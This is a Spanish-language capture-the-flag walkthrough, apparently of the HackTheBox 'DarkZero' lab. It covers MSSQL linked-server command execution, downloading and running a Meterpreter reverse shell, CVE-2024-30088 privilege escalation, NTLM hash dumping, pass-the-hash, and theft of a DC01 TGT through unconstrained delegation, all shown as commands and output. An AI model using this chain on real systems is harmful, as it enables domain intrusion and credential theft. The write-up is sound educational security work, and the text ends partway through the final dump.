### 1. Enumeración inicial

Empezamos la máquina Windows con las credenciales `john.w:RFulUtONCOL!`, vamos a escanear los puertos abiertos:

```bash
sudo nmap -p- --open --min-rate 5000 -n -Pn 10.129.7.54 -oG allPorts
[sudo] contraseña para abra: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-15 20:11 +0000
Nmap scan report for 10.129.7.54
Host is up (0.085s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49666/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49897/tcp open  unknown
63391/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 52.67 seconds
```

Vamos a comprobar las credenciales por defecto proporcionadas a ver si nos deja autenticarnos en el servidor por el servicio **smb**:

```bash
nxc smb 10.129.7.54 -u 'john.w' -p 'RFulUtONCOL!'
SMB         10.129.7.54     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.54     445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
```

Añadimos `DC01.darkzero.htb` y `darkzero.htb` al **/etc/hosts**.

---
### 2. Acceso a MSSQL

Vamos a conectarnos al servidor **mssql**, deberemos especificarle que use **autenticación de Windows**. El escaneo de nmap vimos que no ha detectado mssql abierto, seguramente está configuradp en modo **dynamic ports**. Esto significa que **el servicio SQL Server Browser** (puerto **UDP** 1434) anuncia a los clientes como el que voy a usar de **mssqlclient.py** en qué puerto TCP está escuchando realmente SQL Server:

```bash
mssqlclient.py 'DARKZERO.HTB/john.w:RFulUtONCOL!@10.129.7.54' -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> 
```

Vamos a mirar si tiene **MSSQL Linked Servers**:

```sql
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
```

Hay otro **Domain Controller** en la red, `DC02.darkzero.ext`, vamos a tratar de habilitar **la ejecución remota de comandos**:

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT "DC02.darkzero.ext";

EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT "DC02.darkzero.ext";

EXEC ('xp_cmdshell ''whoami''') AT "DC02.darkzero.ext";
```

Probamos a ejecutar las instrucciones:

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT "DC02.darkzero.ext";
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT "DC02.darkzero.ext";
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''whoami''') AT "DC02.darkzero.ext";
output                 
--------------------   
darkzero-ext\svc_sql   
NULL        
```

**Tenemos ejecución remota de comandos con un usuario de bajos privilegios en DC02**, vamos a comprobar la versión de Windows Server que está usando:

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''systeminfo | findstr /B /C:"OS Name" /C:"OS Version"''') AT "DC02.darkzero.ext";
output                                                                
-------------------------------------------------------------------   
OS Name:                   Microsoft Windows Server 2022 Datacenter   
OS Version:                10.0.20348 N/A Build 20348                 
NULL                                           
```

--- 
### 3. RCE en DC02 y escalada de privilegios (CVE-2024-30088)

La build de Windows es vulnerable a **CVE 2024-30088 - Privesc**. 
https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-30088

Por el momento vamos a usar **Metasploit** para ganar una tty interactiva y explotar la vulnerabilidad, para ello:

Generamos **un payload de Meterpreter** (recuerden cambiar la IP por el de vuestra máquina de atacante):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.224 LPORT=4444 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

Abrimos un servidor de Python en nuestra máquina por el puerto 8000 para servir el archivo:

```bash
python3 -m http.server 8000
```

Configuramos el listener en Metasploit (cambiar la IP por la de vuestra máquina de atacante):

```bash
sudo msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 10.10.15.224

set LPORT 4444

run
```

Ahora desde MSSQL descargamos y ejecutamos el payload de meterpreter:

```sql
EXEC ('xp_cmdshell ''certutil -urlcache -f http://10.10.15.224:8000/shell.exe C:\Windows\Temp\shell.exe''') AT "DC02.darkzero.ext"

EXEC ('xp_cmdshell ''C:\Windows\Temp\shell.exe''') AT "DC02.darkzero.ext";
```

Ejecución de las instrucciones:

```sql
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''certutil -urlcache -f http://10.10.15.224:8000/shell.exe C:\Windows\Temp\shell.exe''') AT "DC02.darkzero.ext"
output                                                
---------------------------------------------------   
****  Online  ****                                    
CertUtil: -URLCache command completed successfully.   
NULL                                                  
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''C:\Windows\Temp\shell.exe''') AT "DC02.darkzero.ext";
```

Veremos que nuestra máquina **recibió la sesión de meterpreter correctamente**:

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] Sending stage (232006 bytes) to 10.129.7.54
[*] Meterpreter session 1 opened (10.10.15.224:4444 -> 10.129.7.54:64755) at 2026-03-15 21:20:31 +0000

meterpreter > getuid
Server username: darkzero-ext\svc_sql
```

Ahora vamos a usar el módulo `windows/local/cve_2024_30088_authz_basep` para explotar **la escalada de privilegios**:

Configuramos el módulo:

```bash
background

use windows/local/cve_2024_30088_authz_basep

set SESSION 1

set LHOST 10.10.15.224

set LPORT 4445 (importante que este puerto sea diferente al que ya estamos usando para la sesión de meterpreter)

run
```

Ejecución del exploit: (**puede llegar a morir la sesión en el proceso, volver a establecer la shell de meterpreter y volver a intentar si llega a ser el caso**).

```bash
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use windows/local/cve_2024_30088_authz_basep
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[*] No encoder configured, defaulting to x64/zutto_dekiru
msf exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 1
SESSION => 1
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.15.224
LHOST => 10.10.15.224
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LPORT 4445
LPORT => 4445
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.15.224:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 2336...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 868
[+] Successfully retrieved winlogon pid: 604
[*] Exploit completed, but no session was created.
```

Vemos que reporta una explotación exitosa aunque no nos crea una sesión nueva privilegiada, igualmente si ahora volvemos a la sesión veremos que podemos **ejecutar hashdump para dumpear todos los hashes NTLM de DC02**, cosa que no podíamos hacer sin explotar la vulnerabilidad:

```bash
msf exploit(windows/local/cve_2024_30088_authz_basep) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:f9bc4ba80131ed99fd8cb6631a9b1348:::
```

**Tenemos los hashes NTLM de los usuarios**. Por el momento vamos a ingresar a la shell que tenemos de DC02 y chequeamos nuestros privilegios:

```powershell
meterpreter > load powershell
[!] The "powershell" extension has already been loaded.
meterpreter > powershell_shell
PS > whoami /priv
ERROR: whoami : ERROR: A specified privilege does not exist.
```

No tenemos privilegios de primeras con **svc_sql**, vamos a obtenerlos a continuación. Estamos en la máquina DC02 por lo que vamos a ver su dirección IP:

```powershell
PS > ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.20.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1
```

Vamos a añadir al **/etc/hosts** lo siguiente: `127.0.0.1 darkzero.ext`, ahora veremos el porque apuntamos a nuestra propia máquina. Necesitamos que nuestra máquina pueda ver DC02 **directamente** para el siguiente paso. Para ello vamos a hacer **port forwarding** del puerto **445** del DC02 al puerto 445 **de nuestra máquina** en Metasploit (necesitaremos msfconsole **ejecutado como root** para ello) y del puerto 5985 (**WinRM**):

```bash
meterpreter > portfwd add -l 445 -p 445 -r 172.16.20.2
[*] Local TCP relay created: :445 <-> 172.16.20.2:445
meterpreter > portfwd add -l 5985 -p 5985 -r 172.16.20.2
[*] Forward TCP relay created: (local) :5985 -> (remote) 172.16.20.2:5985
```

Vamos a entrar como **usuario Administrator en DC02** usando su hash NTLM y la herramienta `psexec.py`, apuntando a nuestra máquina (127.0.0.1) al haber hecho el port forwarding:

```bash
psexec.py -hashes :6963aad8ba1150192f3ca6341355eb49 Administrator@127.0.0.1
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file BFkThChH.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service AKrE on 127.0.0.1.....
[*] Starting service AKrE.....
[!] Press help for extra shell commands                                                                                                                                   Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami                                                                                                                                               nt authority\system

C:\Windows\system32> dir C:\Users\Administrator\Desktop                                                                                                                    Volume in drive C has no label.
 Volume Serial Number is E415-87AD

 Directory of C:\Users\Administrator\Desktop

10/02/2025  08:22 PM    <DIR>          .
03/15/2026  08:14 PM    <DIR>          ..
03/15/2026  08:15 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,316,805,632 bytes free
```

Tenemos la **user flag**, toca ir a por la root flag.

--- 
### 4. Escalada a DC01 mediante Unconstrained Delegation

Vamos a enumerar los **trust relationships** de DC02 usando el módulo de powershell `PowerView.ps1`. Lo descargamos en nuestra máquina de atacante:

```bash
wget -O PowerView.ps1 -4 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

Lo subimos a **DC02** aprovechando la sesión de Metasploit que ya tenemos:

```bash
meterpreter > upload Descargas/PowerView.ps1 C:\\Windows\\Temp\\
[*] Uploading  : /home/abra/Descargas/PowerView.ps1 -> C:\Windows\Temp\PowerView.ps1
[*] Completed  : /home/abra/Descargas/PowerView.ps1 -> C:\Windows\Temp\PowerView.ps1
```

Lo importamos desde nuestra sesión de **Administrator**, y ejecutamos al mismo tiempo `Get-ADComputer`, nos interesa saber si tiene el trust relationship el atributo `TrustedForDelegation` o el `TrustedToAuthForDelegation`:

```cmd
C:\Windows\system32> powershell -exec bypass -c "Import-Module C:\Windows\Temp\PowerView.ps1; Get-ADComputer -Identity $env:COMPUTERNAME -Properties TrustedForDelegation,TrustedToAuthForDelegation"

DistinguishedName          : CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext
DNSHostName                : DC02.darkzero.ext
Enabled                    : True
Name                       : DC02
ObjectClass                : computer
ObjectGUID                 : f85520d0-db6e-4a92-9ebc-f01d6d4cc268
SamAccountName             : DC02$
SID                        : S-1-5-21-1969715525-31638512-2552845157-1000
TrustedForDelegation       : True
TrustedToAuthForDelegation : False
UserPrincipalName          : 
```

`TrustedForDelegation` está en **true**, habilitado. Esto significa que cuando un usuario (o equipo) se autentica en DC02, **su TGT (Ticket Granting Ticket) se almacena en la memoria de DC02** (LSASS) para futuras delegaciones. 

Si forzamos a DC01 a autenticarse contra DC02 , **DC02 guardará el TGT de `DC01$` en memoria.** Si conseguimos capturar dicho ticket **ganaremos acceso a una sesión en DC01**.

Preparativos y flujo de ataque:

Necesitaremos la herramienta **Rubeus** en **DC02** en modo monitor para capturar TGTs entrantes, y **forzar a DC01 a autenticarse contra DC02, creandose el TGT en el proceso y siendo capturado por Rubeus**.

En nuestra máquina descargamos la herramienta **Rubeus**:

```bash
wget -O Rubeus.exe -4 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

La subimos a **DC02** aprovechando la sesión de Meterpreter que tenemos:

```bash
meterpreter > upload Descargas/Rubeus.exe C:\\Windows\\Temp\\
[*] Uploading  : /home/abra/Descargas/Rubeus.exe -> C:\Windows\Temp\Rubeus.exe
[*] Completed  : /home/abra/Descargas/Rubeus.exe -> C:\Windows\Temp\Rubeus.exe
```

En la sesión de **Administrator** vamos a ejecutar Rubeus en modo monitor:

```cmd
C:\Windows\system32> whoami                                                        nt authority\system

C:\Windows\system32> C:\Windows\Temp\Rubeus.exe monitor /interval:5 /nowrap
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


[*] 3/16/2026 4:02:21 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  3/16/2026 3:35:20 PM
  EndTime               :  3/17/2026 1:35:20 AM
  RenewTill             :  3/23/2026 3:35:20 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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
```

**En mi caso** me capturó un TGT sin necesidad de ejecutar la otra herramienta **pero del usuario Administrator lo cual no nos sirve**, y también alguno me ha aparecido de **svc_sql que tampoco nos sirve** seguramente se debe a que todavía tengo la sesión de MSSQL corriendo con la shell de meterpreter, autenticando DC01 contra DC02 en el proceso constantemente. 

**Dejamos la herramienta corriendo** y en otra terminal de nuestra máquina vamos a conectarnos nuevamente a MSSQL, mandando una petición `xp_dirtree \\DC02.darkzero.ext\aaaaa` que forzará la autenticación contra **DC02**:

```bash
mssqlclient.py 'DARKZERO.HTB/john.w:RFulUtONCOL!@10.129.7.205' -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\aaaaa
subdirectory   depth   file   
------------   -----   ----   
SQL (darkzero\john.w  guest@master)> 
```

Veremos en **Rubeus** un TGT asociado a **DC01$**, ese es el que nos interesa:

```cmd
[*] 3/16/2026 4:15:33 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  3/16/2026 4:15:32 PM
  EndTime               :  3/17/2026 2:15:32 AM
  RenewTill             :  3/23/2026 4:15:32 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZKD5tpEmZ7CjYvf2u4evrfD0bbeC36zS0wBZnz6weBuQhcba286QWkQBwOOqe9odrvmuqV8UeFo21ugfBAvb85E/pD0fnfO+03WlytM78xDtHdh/e+caxQdHPnuR+KQHarl6+mX3kh7TDUwa7Y4ZuY6RH9ebSN5YU54DD9AETRZwuJz1Qvkhpd5Ur5A2VfduSAPHwMuKCzO9FswFTpsCsUYGUDDq6WCVO+blMQa92GzrsbsODEx9oDGBUpiT3ZPxx7iLdVLIeQENcQnSFqAUGzVcHfV/KEmKWh7DtBoj0TzA9w4FRJ8faqZHuRdwx0YIZKtXrs6OBXe9JUxMMX2X670ZoXf7n915GMGvmdTw4Qj5lp0YzK6hVnjGTqQvRkDFfP2h/PsWrT6ops7VmV+6rA7rbsDJnu31YnYTApi8uWYo9s2nX1SdoNwCEbxZIWOrJnw0PlptyhkW80Ee6FQXEPKzq1/RzKVRNOjN9lGZiNybKnxV4ES6wlG0rTh1X/sXVE+83z0PArRa2KKxT3CtOiVBj9FRJCVX14Zb5TZQnCD7Ay+xoXf83sAHQWrnsaXIFKgUk8o11ViAdEuP89DtL/gk13EK5mD5CakmT+UmrIMNAB6owVxucIH749/wnI0maLfyPCAnUfg5uq8cL0gk5ucJ+Z9DGozwMKZymxqUC0V2KqYj1C0nG7tmrDrfIRqY0r+UrVnr3eQOcnziczIqjCDIzO1EIa+5mzWUKShutMqUdEG3Y4O76oGffNNFLqtoFAzU4pfN6kLjPMIG/WkP/+2VGBw2cHP9EtOB9jWZArTQ4mexdW4FgylkLQyJMwcO2XiYiuQ1oO5wTcFb3IdyFH9Sf2xvmkbJNdis8lefTN/CZiq4I0JHKNq1Gh8+E+9rGB+xghHtzgM8FZ+jK1yEHhmOw0e4Hi3U3XuHDnysVLUsEr/+huRS44Bu7rc3zMh5CeWl3Gw1wCn1PQ/NpEnZL3uSRsb95HOudeDxXqgdfhYmMWgz9gTyO6bkBwVjICm49UqW5WauaUPktdRjXSz4qc1zFzmYnHL1pe/vYckDX2aQd/JxD3i5BHMrkDi12HTv6Iwic3tIwd2Bs7O8isurCibr3+tFwndKXHFG/jPFTqL6HsRUnvhuG+40B++lVxJv1DKbaZNUjXhjQaBFUI/c3ERtarXMCoFAfEOGWzKFzzvHAvmjVdBxVKvBapFsLyrswA/uXRf/pIW99+y9v8X78AsHNsrMGpiGxB0TnBIiUpRkEoBrBh/2oc6VGwtVOyLq9vyOtpA5H0JmSqpcFGcZBc7bJkingzRmQpuG/qrQaTm2WXRkpGu1ZlPW6AyaH4+zRls1SHe+cZKSTSnJO8rutQBKXj+F+ImeirFJkyXcP+2qVI5RtXwAoWdDKkiAsugrFWMpFDbG+juh0VSVoAoZw8Gt+CCyvGo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgK+lchdmymN0BegAv7dfWjt4c5Fg14RIwBV6E+MWNDRihDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNjAzMTYxNjE1MzJaphEYDzIwMjYwMzE3MDIxNTMyWqcRGA8yMDI2MDMyMzE2MTUzMlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 7
```

Toda esta cadena en base64 vamos a meterla decodificandola a un fichero `dc01.kirbi` en nuestra máquina de atacante:

```shell
echo "doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZKD5tpEmZ7CjYvf2u4evrfD0bbeC36zS0wBZnz6weBuQhcba286QWkQBwOOqe9odrvmuqV8UeFo21ugfBAvb85E/pD0fnfO+03WlytM78xDtHdh/e+caxQdHPnuR+KQHarl6+mX3kh7TDUwa7Y4ZuY6RH9ebSN5YU54DD9AETRZwuJz1Qvkhpd5Ur5A2VfduSAPHwMuKCzO9FswFTpsCsUYGUDDq6WCVO+blMQa92GzrsbsODEx9oDGBUpiT3ZPxx7iLdVLIeQENcQnSFqAUGzVcHfV/KEmKWh7DtBoj0TzA9w4FRJ8faqZHuRdwx0YIZKtXrs6OBXe9JUxMMX2X670ZoXf7n915GMGvmdTw4Qj5lp0YzK6hVnjGTqQvRkDFfP2h/PsWrT6ops7VmV+6rA7rbsDJnu31YnYTApi8uWYo9s2nX1SdoNwCEbxZIWOrJnw0PlptyhkW80Ee6FQXEPKzq1/RzKVRNOjN9lGZiNybKnxV4ES6wlG0rTh1X/sXVE+83z0PArRa2KKxT3CtOiVBj9FRJCVX14Zb5TZQnCD7Ay+xoXf83sAHQWrnsaXIFKgUk8o11ViAdEuP89DtL/gk13EK5mD5CakmT+UmrIMNAB6owVxucIH749/wnI0maLfyPCAnUfg5uq8cL0gk5ucJ+Z9DGozwMKZymxqUC0V2KqYj1C0nG7tmrDrfIRqY0r+UrVnr3eQOcnziczIqjCDIzO1EIa+5mzWUKShutMqUdEG3Y4O76oGffNNFLqtoFAzU4pfN6kLjPMIG/WkP/+2VGBw2cHP9EtOB9jWZArTQ4mexdW4FgylkLQyJMwcO2XiYiuQ1oO5wTcFb3IdyFH9Sf2xvmkbJNdis8lefTN/CZiq4I0JHKNq1Gh8+E+9rGB+xghHtzgM8FZ+jK1yEHhmOw0e4Hi3U3XuHDnysVLUsEr/+huRS44Bu7rc3zMh5CeWl3Gw1wCn1PQ/NpEnZL3uSRsb95HOudeDxXqgdfhYmMWgz9gTyO6bkBwVjICm49UqW5WauaUPktdRjXSz4qc1zFzmYnHL1pe/vYckDX2aQd/JxD3i5BHMrkDi12HTv6Iwic3tIwd2Bs7O8isurCibr3+tFwndKXHFG/jPFTqL6HsRUnvhuG+40B++lVxJv1DKbaZNUjXhjQaBFUI/c3ERtarXMCoFAfEOGWzKFzzvHAvmjVdBxVKvBapFsLyrswA/uXRf/pIW99+y9v8X78AsHNsrMGpiGxB0TnBIiUpRkEoBrBh/2oc6VGwtVOyLq9vyOtpA5H0JmSqpcFGcZBc7bJkingzRmQpuG/qrQaTm2WXRkpGu1ZlPW6AyaH4+zRls1SHe+cZKSTSnJO8rutQBKXj+F+ImeirFJkyXcP+2qVI5RtXwAoWdDKkiAsugrFWMpFDbG+juh0VSVoAoZw8Gt+CCyvGo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgK+lchdmymN0BegAv7dfWjt4c5Fg14RIwBV6E+MWNDRihDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNjAzMTYxNjE1MzJaphEYDzIwMjYwMzE3MDIxNTMyWqcRGA8yMDI2MDMyMzE2MTUzMlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=" | base64 -d > dc01.kirbi
```

Convertimos este ticket de Kerberos en un fichero `.ccache` (las herramientas usadas a continuación vienen con el paquete **impacket**):

```bash
ticketConverter.py dc01.kirbi dc01.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Ahora **creamos la variable de entorno `KRB5CCNAME` con el valor de la ruta de nuestro archivo `.ccache`** para que la herramienta `secretsdump.py` sepa la ubicación de dicho archivo:

```bash
export KRB5CCNAME=$(pwd)/dc01.ccache

echo $KRB5CCNAME
/home/abra/Documentos/Hacking/htb_machines/DarkZero/dc01.ccache
```

**Con esto ya podemos dumpear los hashes NTLM de DC01**:

```bash
secretsdump.py 'DC01$'@DC01.darkzero.htb -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
